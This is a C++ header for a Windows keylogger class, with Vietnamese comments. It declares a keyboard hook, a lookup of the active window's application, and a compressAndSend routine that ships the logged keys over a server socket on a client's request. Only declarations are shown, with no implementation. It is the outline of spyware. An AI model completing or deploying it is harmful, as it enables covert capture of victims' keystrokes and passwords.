#pragma once

#include "utils.h"
#include <thread>
#include <winsock.h>
#include <psapi.h>
#include <chrono>
#include <direct.h>

class KeyloggerThread {
private:
	thread worker;
	json requestFromClient;
	atomic<bool> keylogger_running{ false };
	int server_socket;
	const int BUFFER_SIZE = 8192;
	char buffer[8192] = { 0 };

	// Lấy tên của ứng dụng hoặc chương trình hiện đang hiển thị trên cửa sổ Window
	static string GetWindowApp();

	// Quá trình hoạt động keylogger
	static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	void handleKeylogger();

	void startKeylogger();

	void compressAndSend();

	void workerThread();

public:
	KeyloggerThread(int server_socket) : server_socket(server_socket) {
	}

	void start(json request);

	void stop();

	~KeyloggerThread() {
		stop();
	}

};